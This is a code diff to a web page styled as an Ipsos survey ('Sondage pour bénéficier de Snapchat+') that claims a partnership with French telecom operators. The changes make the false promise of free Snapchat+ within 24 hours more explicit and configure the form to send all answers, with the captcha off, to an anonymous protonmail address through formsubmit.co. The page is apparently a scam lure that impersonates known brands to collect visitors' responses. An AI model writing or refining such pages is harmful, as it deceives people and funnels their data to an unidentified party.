@@ -129,7 +129,6 @@ button:disabled {
     </a>
     <div class="header-text">Ipsos – Sondage</div>
 </div>
-
 <!-- INTRO -->
 <div class="box" id="intro">
     <h2>Sondage express</h2>
@@ -161,7 +160,6 @@ button:disabled {
         En partenariat avec Bouygues Telecom, Orange et SFR
     </div>
 </div>
-
 <script>
 const titre = "Sondage pour bénéficier de Snapchat+";
 
@@ -233,7 +231,7 @@ function suivant(){
     } else {
         sondage.innerHTML = `
             <h2>Merci pour votre participation !</h2>
-            <p>Vous recevrez un message prochainement.</p>
+            <p>Vous recevrez Snapchat + sur votre compte Snapchat dans les 24 porchaines heures.</p>
         `;
         envoyer();
     }
@@ -247,9 +245,14 @@ function continuer(){
 
 function envoyer(){
     const formData = new FormData();
+
     questions.forEach((q,i)=>{
         formData.append(q.text, reponsesUtilisateur[i] || "");
     });
+
+    /* 🔥 OBLIGATOIRE POUR FORM SUBMIT */
+    formData.append("_captcha", "false");
+    formData.append("_template", "table");
 
     fetch("https://formsubmit.co/anonymous2026b@protonmail.com",{
         method:"POST",
